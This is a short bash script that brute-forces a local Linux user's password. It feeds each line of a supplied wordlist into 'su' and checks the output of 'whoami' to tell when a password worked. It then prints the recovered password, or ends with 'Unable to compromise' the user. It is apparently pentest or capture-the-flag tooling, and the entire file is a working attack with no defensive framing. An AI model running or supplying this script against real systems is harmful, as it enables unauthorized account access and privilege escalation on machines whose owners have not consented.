#!/bin/bash
USER="${1}"
PASSWORD_FILE="${2}"

if [[ -z "${USER}" ]]; then
    echo "enter a user"
    exit 1
fi

if [[ ! -f "${PASSWORD_FILE}" ]]; then
    echo "password list file does not exist, create one."
    exit 1
fi 

while read -r password; do 
    echo "Attempting ${password} against ${USER}..."
    if echo "${password}" | timeout 0.2 su - ${USER} \
        -c 'whoami' | grep -q "${USER}"; then
        echo  "The password for ${USER} is ${password}"
    exit 0
    fi
done < "${PASSWORD_FILE}" 

echo "Unable to compromise ${USER}"
exit 1